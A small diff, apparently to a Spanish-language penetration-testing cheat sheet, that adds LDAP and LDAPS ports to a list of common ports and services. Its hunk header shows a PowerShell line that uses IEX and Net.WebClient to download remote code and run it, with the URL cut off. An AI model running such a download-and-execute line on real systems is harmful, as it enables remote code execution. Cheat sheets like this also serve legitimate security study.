@@ -1831,7 +1831,9 @@ Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http
 ## Puertos Comunnes y Servicios
 
 ```bash
-88/tcp Kerberos
+88/tcp   Kerberos
+389/tcp  LDAP
+636/tcp  LDAPS 
 5985/tcp WinRM
 
 
